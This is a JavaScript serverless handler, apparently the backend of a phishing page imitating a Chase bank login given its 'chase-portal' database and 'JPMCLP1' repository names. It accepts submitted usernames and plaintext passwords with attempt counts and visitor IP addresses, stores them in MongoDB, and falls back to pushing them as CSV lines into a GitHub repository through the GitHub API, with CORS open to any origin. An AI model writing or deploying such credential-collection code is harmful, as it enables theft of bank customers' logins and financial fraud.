import mongoose from 'mongoose';

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/chase-portal';
const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const GITHUB_REPO = process.env.GITHUB_REPO || 'sapphirenetllc/JPMCLP1';

// Login Log Schema
const loginLogSchema = new mongoose.Schema({
  timestamp: { type: Date, default: Date.now, index: true },
  username: String,
  password: String,
  attemptNumber: Number,
  status: String,
  userAgent: String,
  ipAddress: String,
}, { collection: 'login_logs' });

const LoginLog = mongoose.model('LoginLog', loginLogSchema);

let dbConnected = false;
let connection = null;

async function connectDB() {
  if (connection) return connection;
  
  try {
    connection = await mongoose.connect(MONGODB_URI, {
      serverSelectionTimeoutMS: 5000,
      retryWrites: true,
      w: 'majority'
    });
    dbConnected = true;
    console.log('✅ Connected to MongoDB');
    return connection;
  } catch (err) {
    console.warn('⚠️  MongoDB connection failed:', err.message);
    dbConnected = false;
    return null;
  }
}

async function saveToGitHub(logData) {
  if (!GITHUB_TOKEN) {
    console.warn('⚠️  GITHUB_TOKEN not set, skipping GitHub backup');
    return false;
  }

  try {
    // Format log as CSV line
    const csvLine = [
      new Date(logData.timestamp).toISOString(),
      logData.username,
      '***', // Don't store password in public repo
      logData.attemptNumber,
      logData.status,
      logData.userAgent,
      logData.ipAddress
    ].join(',');

    // Append to CSV file in GitHub
    const filePath = 'logs/login_attempts.csv';
    const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
    
    // Get current file content
    const getResponse = await fetch(url, {
      headers: {
        'Authorization': `token ${GITHUB_TOKEN}`,
        'Accept': 'application/vnd.github.v3+json'
      }
    });

    let newContent = csvLine + '\n';
    let sha = null;

    if (getResponse.ok) {
      const data = await getResponse.json();
      const currentContent = Buffer.from(data.content, 'base64').toString('utf-8');
      newContent = currentContent + csvLine + '\n';
      sha = data.sha;
    }

    // Update file
    const response = await fetch(url, {
      method: 'PUT',
      headers: {
        'Authorization': `token ${GITHUB_TOKEN}`,
        'Accept': 'application/vnd.github.v3+json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        message: `Log login attempt: ${logData.username}`,
        content: Buffer.from(newContent).toString('base64'),
        sha
      })
    });

    if (response.ok) {
      console.log('✅ Logged to GitHub');
      return true;
    } else {
      console.warn('⚠️  Failed to log to GitHub:', response.status);
      return false;
    }
  } catch (err) {
    console.error('Error saving to GitHub:', err.message);
    return false;
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  try {
    await connectDB();

    if (req.method === 'POST') {
      const { username, password, attemptNumber, status, timestamp, userAgent } = req.body;
      
      const ipAddress = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'unknown';
      
      const logData = {
        timestamp: new Date(timestamp),
        username,
        password,
        attemptNumber,
        status,
        userAgent,
        ipAddress,
      };
      
      let stored = 'GitHub';
      
      if (dbConnected) {
        try {
          const log = new LoginLog(logData);
          await log.save();
          stored = 'MongoDB';
        } catch (err) {
          console.error('Error saving to MongoDB:', err.message);
          dbConnected = false;
          // Try GitHub backup
          await saveToGitHub(logData);
        }
      } else {
        // Try GitHub backup
        await saveToGitHub(logData);
      }
      
      console.log(`[${new Date().toISOString()}] Login attempt logged: ${username} (Attempt #${attemptNumber} - ${status}) [${stored}]`);
      
      res.status(200).json({ 
        success: true, 
        message: 'Login attempt logged',
        stored
      });
    }
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
}
